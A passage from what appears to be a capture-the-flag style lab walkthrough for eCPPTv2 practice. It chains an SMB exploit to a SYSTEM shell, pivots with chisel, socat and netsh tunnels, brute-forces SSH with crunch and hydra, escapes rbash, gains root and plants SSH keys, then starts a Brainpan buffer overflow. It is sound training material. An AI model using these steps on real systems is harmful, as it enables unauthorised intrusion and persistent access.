[proxychains] Dynamic chain  ...  127.0.0.1:8888  ...  127.0.0.1:1080 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:8888  ...  192.168.57.6:445  ...  OK
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: browser
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa800267d920
SESSION: 0xfffff8a00212e3a0
FLINK: 0xfffff8a00217b088
InParam: 0xfffff8a00217515c
MID: 0x2303
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
Opening SVCManager on 192.168.57.6.....
Creating service aRYU.....
Starting service aRYU.....
```

We can check our `netcat` listener:

```zsh
❯ rlwrap nc -lvnp 4646
listening on [any] 4646 ...
connect to [192.168.0.111] from (UNKNOWN) [192.168.0.114] 52356
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::75:6494:9cb8:8a79%13
   IPv4 Address. . . . . . . . . . . : 192.168.58.4
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::b9f8:ba39:fe00:47c4%11
   IPv4 Address. . . . . . . . . . . : 192.168.57.6
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

Tunnel adapter isatap.{258B5978-E435-4198-9C22-C6CB3296EBB5}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter isatap.{0A853209-54C0-43B0-9D24-14A6A92E3D58}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

C:\Windows\system32>
```

Nice! Here we can see that this machine has **another** network interface: **192.168.58.X**.

# Matrix 1
---

![](/assets/img/eCPPTv2/matrix.png)

---

## Tunnelling network interface `vboxnet2` to `wlan0`:
---

To achieve this we are going to need to create a **triple socks proxy**. But first we need to see if there is more computers connected to this network interface:

```zsh
C:\>for /L %a in (1,1,254) do @start /b ping 192.168.58.%a -w 100 -n 2 >nul
for /L %a in (1,1,254) do @start /b ping 192.168.58.%a -w 100 -n 2 >nul

C:\>arp -a
arp -a

Interface: 192.168.57.6 --- 0xb
  Internet Address      Physical Address      Type
  192.168.57.11         08-00-27-f5-68-8a     dynamic   

Interface: 192.168.58.4 --- 0xd
  Internet Address      Physical Address      Type
  192.168.58.1          0a-00-27-00-00-02     dynamic   
  192.168.58.2          08-00-27-30-1c-e9     dynamic   
  192.168.58.3          08-00-27-1f-20-c4     dynamic   

C:\>
```

Here we can suppose that the **192.168.58.3** is the `Matrix`'s IP address:

```zsh
C:\>ping -n 1 192.168.58.3
ping -n 1 192.168.58.3

Pinging 192.168.58.3 with 32 bytes of data:
Reply from 192.168.58.3: bytes=32 time<1ms TTL=64

Ping statistics for 192.168.58.3:
    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms

C:\>
```

Now we need to upload `chisel` to `Dumbledore-PC`, but we can't use the same `chisel` we used earlier, we need to use one expecific version of [chisel for Windows](https://github.com/jpillora/chisel/releases). Now, to upload it is very simple, we just need to copy the binary to the `smbFolder` directory of our machine and take advantage of the proxyes to copy it into our machine:

```zsh
C:\>copy \\192.168.57.11\smbFolder\chisel.exe C:\Windows\Temp\chisel.exe
copy \\192.168.57.11\smbFolder\chisel.exe C:\Windows\Temp\chisel.exe
        1 file(s) copied.

C:\>cd C:\Windows\Temp
cd C:\Windows\Temp

C:\Windows\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 50F8-2492

 Directory of C:\Windows\Temp

06/07/2023  06:07 PM    <DIR>          .
06/07/2023  06:07 PM    <DIR>          ..
06/07/2023  09:03 AM         8,676,864 chisel.exe
06/03/2023  12:58 PM                 0 DMI37F3.tmp
06/03/2023  03:37 PM               936 MpCmdRun.log
06/07/2023  08:10 AM            28,160 nc.exe
06/03/2023  12:59 PM           114,688 TS_1190.tmp
06/03/2023  12:59 PM            98,304 TS_1829.tmp
06/03/2023  12:59 PM           180,224 TS_1C50.tmp
06/03/2023  12:59 PM           655,360 TS_1E74.tmp
06/03/2023  12:59 PM           360,448 TS_2D7.tmp
06/03/2023  12:59 PM            98,304 TS_857.tmp
06/03/2023  12:59 PM           409,600 TS_A4C.tmp
06/03/2023  12:59 PM           196,608 TS_B4.tmp
06/03/2023  12:59 PM           131,072 TS_FD38.tmp
              13 File(s)     10,950,568 bytes
               2 Dir(s)  25,055,965,184 bytes free

C:\Windows\Temp>
```

Now we need to execute chisel to send it to the `Nagini` machine on a new port. After that send the connection to the `Aragog` machine to the port **6464** to connect it to our `chisel` main server on port **9001**:

```zsh
# Dumbledore-PC
C:\Windows\Temp>.\chisel.exe client 192.168.57.11:6565 R:9999:socks
.\chisel.exe client 192.168.57.11:6565 R:9999:socks

# Nagini
root@Nagini:~# ./socat TCP-LISTEN:6565,fork TCP:192.168.56.6:6464

# Aragog
root@Aragog:~# ./socat TCP-LISTEN:6464,fork TCP:192.168.0.111:9001
```

And in our `chisel` main server we would see the port **9999**:

![](/assets/img/eCPPTv2/58.png)

Perfect! Now we just need to add it into our `proxychains.conf` file:

![](/assets/img/eCPPTv2/59.png)

And by pinging the machine we can see that we can reach it:

```zsh
❯ proxychains ping -c 1 192.168.58.3 2>/dev/null
PING 192.168.58.3 (192.168.58.3) 56(84) bytes of data.
64 bytes from 192.168.58.3: icmp_seq=1 ttl=64 time=0.505 ms

--- 192.168.58.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.505/0.505/0.505/0.000 ms
```

## Enumeration 
---

Let's perform a `nmap` scan of the opened ports:

```zsh
❯ proxychains nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 192.168.58.3 -oG allPorts 2>/dev/null
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 18:24 CEST
Initiating ARP Ping Scan at 18:24
Scanning 192.168.58.3 [1 port]
Completed ARP Ping Scan at 18:24, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:24
Scanning 192.168.58.3 [65535 ports]
Discovered open port 80/tcp on 192.168.58.3
Discovered open port 22/tcp on 192.168.58.3
Discovered open port 31337/tcp on 192.168.58.3
Completed SYN Stealth Scan at 18:24, 1.20s elapsed (65535 total ports)
Nmap scan report for 192.168.58.3
Host is up, received arp-response (0.00016s latency).
Scanned at 2023-06-07 18:24:22 CEST for 1s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 64
80/tcp    open  http    syn-ack ttl 64
31337/tcp open  Elite   syn-ack ttl 64
MAC Address: 08:00:27:1F:20:C4 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.45 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Now let's extract those ports and perform a **deeper** scan:

>**Note:** You can enumerate the web with `gobuster` but you are not going to find anything. We need to focus our attention on the port **31337**.

## Foothold
---

We can start checking the web with `whatweb`:

```zsh
❯ proxychains -q whatweb http://192.168.58.3:31337
http://192.168.58.3:31337 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[SimpleHTTP/0.6 Python/2.7.14], IP[192.168.58.3], JQuery, Python[2.7.14], Script[text/javascript], Title[Welcome in Matrix]
```

Now let's check it in our browser:

![](/assets/img/eCPPTv2/60.png)

All right! This web is different than the other one on port **80** (the rabbit hole). 
If we check the source code of the web we can see a `base64` string:

![](/assets/img/eCPPTv2/61.png)

Let's decode it:

```bash
echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " > Cypher.matrix
```

Interesting message. We can see that seems a `bash` command which is putting that text into the file `Cypher.matrix`, so we can see if that file exists on the web:

![](/assets/img/eCPPTv2/62.png)

Ok so just because of the structure of this file we can deduce that is `brainfuck` language. We can decode it with this [page](https://www.dcode.fr/brainfuck-language):

![](/assets/img/eCPPTv2/63.png)

## Getting user (guest) via SSH -> Custom wordlist creation & Brute Force
---

We can see that is talking about a user `guest` and a password `k1ll0rXX` (X = forgoted character). I suppose that these credetials are valid for connecting via `SSH`. The problem here is that we don't have the last two characters of this password. You may wander how can we find these two characters. Well, we are going to use the tool `crunch` to create a wordlist, but this will lead us to a second doubt, how can se check which is the correct password? Well, we are going to use the tool `hydra` to averiguate this password:

```zsh
❯ crunch 8 8 -t k1ll0r%@ > passwords.txt
Crunch will now generate the following amount of data: 2340 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260 
                                    
❯ crunch 8 8 -t k1ll0r@% >> passwords.txt
Crunch will now generate the following amount of data: 2340 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260 
                                  
❯ cat passwords.txt | wc -l
520
```

What this bassically do is to generate a wordlist where `@` are lowercase letters and `%` are numbers. The numbers (8 8) mean the minimun length of the password and the maximum length of the password, respectively. The `>>` is because we don't want to overwrite the content on `passwords.txt`, we want to add it.

With this customized wordlist in our possession, we can use the tool `hydra` to bruteforce the `SSH` password for the user `guest`:

```zsh
❯ proxychains -q hydra -l guest -P passwords.txt ssh://192.168.58.3 -t 20
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-07 19:17:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 20 tasks per 1 server, overall 20 tasks, 520 login tries (l:1/p:520), ~26 tries per task
[DATA] attacking ssh://192.168.58.3:22/
[STATUS] 175.00 tries/min, 175 tries in 00:01h, 345 to do in 00:02h, 20 active
[22][ssh] host: 192.168.58.3   login: guest   password: k1ll0r7n
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-07 19:18:56
```

All right! We have credentials for `SSH`, so let's connect:

```zsh
❯ proxychains -q ssh guest@192.168.58.3
The authenticity of host '192.168.58.3 (192.168.58.3)' can't be established.
ED25519 key fingerprint is SHA256:7J8BisyeEyPLY56CVLgtGcEa+Kp665WwwL1HB3GtIpQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.58.3' (ED25519) to the list of known hosts.
guest@192.168.58.3's password: 
Last login: Mon Aug  6 16:25:44 2018 from 192.168.56.102
guest@porteus:~$ whoami
-rbash: whoami: command not found
guest@porteus:~$ 
```

### Bypassing `rbash`
---

Ok, we can connect, but can't execute bassically any command because this is a `rbash` (Restricted Bash). But, there is a very easy way to bypass this restriction with `SSH`:

```zsh
❯ proxychains -q ssh guest@192.168.58.3 bash
guest@192.168.58.3's password: 
whoami
guest
script /dev/null -c bash
Script started, file is /dev/null
guest@porteus:~$ export TERM=xterm
export TERM=xterm
guest@porteus:~$ whoami
whoami
guest
guest@porteus:~$ ls -l /bin/bash
ls -l /bin/bash
-rwxr-xr-x 1 root root 1102944 Mar 29  2018 /bin/bash*
guest@porteus:~$ 
```

Perfect! We've successfully bypassed this `rbash`!

## Privilege escalation
---

This looks like a joke:

```zsh
guest@porteus:~$ sudo -l
sudo -l
User guest may run the following commands on porteus:
    (ALL) ALL
    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
    (trinity) NOPASSWD: /bin/cp
guest@porteus:~$ sudo su
sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password: k1ll0r7n

root@porteus:/home/guest# whoami
whoami
root
root@porteus:/home/guest# 
```

Rooted!
Although, we can notice that there is **one more network interface**! So I suppose that the last machine is hosted in that interface :D

```zsh
root@porteus:~# ifconfig
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.59.4  netmask 255.255.255.0  broadcast 192.168.59.255
        inet6 fe80::a00:27ff:fe8e:3a80  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:8e:3a:80  txqueuelen 1000  (Ethernet)
        RX packets 63  bytes 16434 (16.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 53  bytes 9818 (9.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth2: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.58.3  netmask 255.255.255.0  broadcast 192.168.58.255
        inet6 fe80::a00:27ff:fe1f:20c4  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:1f:20:c4  txqueuelen 1000  (Ethernet)
        RX packets 136663  bytes 8345420 (7.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 135196  bytes 10777224 (10.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 6  bytes 300 (300.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6  bytes 300 (300.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@porteus:~# 
```

## Establishing persistence
---

This machine doesn't have a `.ssh` directory, so let's create it and add our public key into it:

```zsh
root@porteus:~# mkdir .ssh
root@porteus:~# cd !$
cd .ssh
root@porteus:~/.ssh# nano authorized_keys
bash: nano: command not found
root@porteus:~/.ssh# vi authorized_keys
root@porteus:~/.ssh# 
```

Now we can easily connect to the machine as root:

```zsh
❯ proxychains ssh root@192.168.58.3
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Dynamic chain  ...  127.0.0.1:9999  ...  127.0.0.1:8888 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9999  ...  127.0.0.1:1080 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9999  ...  192.168.58.3:22  ...  OK
root@porteus:~# whoami
root
root@porteus:~# 
```

# Brainpan
---

![](/assets/img/eCPPTv2/brainpan.png)

---

After creating the `hostDiscover` script, we can deduce that the IP **192.168.59.5** is our target:

```zsh
root@porteus:~# vi hostDiscover.sh
root@porteus:~# chmod +x hostDiscover.sh
root@porteus:~# ./hostDiscover.sh
[+] HOST - 192.168.59.4 - ACTIVE
[+] HOST - 192.168.59.2 - ACTIVE
[+] HOST - 192.168.59.5 - ACTIVE
[+] HOST - 192.168.59.1 - ACTIVE
root@porteus:~# ping -c 1 192.168.59.5
PING 192.168.59.5 (192.168.59.5) 56(84) bytes of data.
64 bytes from 192.168.59.5: icmp_seq=1 ttl=64 time=0.963 ms

--- 192.168.59.5 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.963/0.963/0.963/0.000 ms
root@porteus:~# 
```

Here is the script:

```bash
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo...\n"
    tput cnorm; exit 1
}

# Ctrl+C
trap ctrl_c INT

tput civis
for i in $(seq 1 254); do
    timeout 1 bash -c "ping -c 1 192.168.59.$i" &>/dev/null && echo "[+] HOST - 192.168.59.$i - ACTIVE" &
done; wait
tput cnorm
```

## Tunnelling `vboxnet3` to `wlan0`
---

At this point this is how our network map should be looking like:

![](/assets/img/eCPPTv2/64.png)

To redirect the whole connection is the same idea as always, but the only thing that changes is that there are more machines and that one of them is a Windows machine, so we can't use `socat`, we need to use `netsh`:

```zsh
# Matrix
./chisel client 192.168.58.4:8787 R:7777:socks

# Dumbledore-PC
C:\Windows\Temp>netsh interface portproxy add v4tov4 listenport=8787 listenaddress=0.0.0.0 connectport=8788 connectaddress=192.168.57.11

# Nagini
root@Nagini:~# ./socat TCP-LISTEN:8788,fork TCP:192.168.56.6:8789

# Aragog
root@Aragog:~# ./socat TCP-LISTEN:8789,fork TCP:192.168.0.111:9001
```

>**Note:** If you have some trouble connecting to the `Nagini` machine, because is pretty unstable, you can portforward the port **22** of the `Nagini` machine from the `Aragog` machine, so after that you can connect like this: `ssh root@localhost`.

And, again, in our `chisel` main server we should see the port **7777**:

![](/assets/img/eCPPTv2/65.png)

Now in the `proxychains.conf` file we can add this new port:

![](/assets/img/eCPPTv2/66.png)

Now we can ping the machine to see if everything went OK:

```zsh
❯ proxychains -q ping -c 1 192.168.59.5
PING 192.168.59.5 (192.168.59.5) 56(84) bytes of data.
64 bytes from 192.168.59.5: icmp_seq=1 ttl=64 time=0.315 ms

--- 192.168.59.5 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.315/0.315/0.315/0.000 ms
```

And perfect, we reach the machine.

## Enumeration
---

Let's perform a scan with `nmap`:

```zsh
❯ proxychains nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 192.168.59.5 -oG allPorts 2>/dev/null
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 21:52 CEST
Initiating ARP Ping Scan at 21:52
Scanning 192.168.59.5 [1 port]
Completed ARP Ping Scan at 21:52, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:52
Scanning 192.168.59.5 [65535 ports]
Discovered open port 10000/tcp on 192.168.59.5
Discovered open port 9999/tcp on 192.168.59.5
Completed SYN Stealth Scan at 21:52, 3.28s elapsed (65535 total ports)
Nmap scan report for 192.168.59.5
Host is up, received arp-response (0.00034s latency).
Scanned at 2023-06-07 21:52:03 CEST for 3s
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
9999/tcp  open  abyss            syn-ack ttl 64
10000/tcp open  snet-sensor-mgmt syn-ack ttl 64
MAC Address: 08:00:27:44:85:98 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.60 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Taking a look to the port **10000** we can notice that is a web:

![](/assets/img/eCPPTv2/67.png)

Well, this web is only an image so let's enumerate some directories with `gobuster`:

```zsh
❯ gobuster dir -u http://192.168.59.5:10000 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --proxy socks5://127.0.0.1:7777
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.59.5:10000
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   socks5://127.0.0.1:7777
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/07 22:00:37 Starting gobuster in directory enumeration mode
===============================================================

Error: error on running gobuster: context deadline exceeded (Client.Timeout or context cancellation while reading body)
```

But with such many proxyes it crashes, so let's use `burpsuite`:

![](/assets/img/eCPPTv2/68.png)

You need to set up `burp` as I show in this screenshot. 
Now, because we are using bassically the same proxy but this time setted up in `burp` instead of `FoxyProxy`, we can reach the page whithout any problems:

![](/assets/img/eCPPTv2/69.png)

Now we can intercept a random request on the web `http://192.168.59.5:100000/test`. After that, send the request to `Intruder` (CTRL + I)

![](/assets/img/eCPPTv2/70.png)

Now, select `test` and add a payload:

![](/assets/img/eCPPTv2/71.png)

After that load your wordlist (I am going to use `/usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt)

![](/assets/img/eCPPTv2/72.png)

Ok, so everything is setted up, so let's click on **"Start Attack"**:

![](/assets/img/eCPPTv2/73.png)

After a while we can see that `burp` found this directory: `/bin`, so let's access it on the web:

![](/assets/img/eCPPTv2/74.png)

Ok, so here we can see there is a binary called `brainpan.exe`, so let's download it.
Now let's fire up our Windows 7 32bit machine so we can debug this `.exe`

## Buffer Overflow (Stack Based)
---

### Locally debugging
---

>**Note:** You need to install Inmmunity Debugger and Python2.7. You will also need to enable ICMP on Windows Firewall:

![](/assets/img/eCPPTv2/75.png)

You'll need to enable in Inbound Rules and in Outbound Rules.
Now, transfer `brainpan.exe` to the W7 machine. You can do this with a python server.

When you have the file, execute it and then open `Inmunity Debugger`. Now, attack a new file:

![](/assets/img/eCPPTv2/76.png)

![](/assets/img/eCPPTv2/77.png)

When we run the program (right down corner) we can see some registers, such as `EIP`, `EBP`...

![](/assets/img/eCPPTv2/78.png)

Well, if we connect to the program and we input a lot of junk bytes:

```zsh
❯ nc 192.168.0.119 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Let's check the behavior of the program:

![](/assets/img/eCPPTv2/79.png)

Great! So as we can see, we've modified the `EIP`. This is happenning because maybe the developer of this program established a buffer size, but when we input junk that breaks the limit of that buffer size, the registers get overwrited with our input. This would be the usual behaviour of the buffer:

![](/assets/img/buffemr/17.png)

And this will be the behaviour of the buffer when we input junk:

![](/assets/img/buffemr/18.png)

As we can see on last picture, the registers are being overwritten. This is the same procedure we did in `Fawkes` machine, but the uniq problem is that we have to do it on a W7 machine and mines is **very** slow. 
We are going to start by creating a pattern of 1000 bytes, and then input it into the program so we can see where we can start modifying the register `EIP`:

```zsh
❯ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
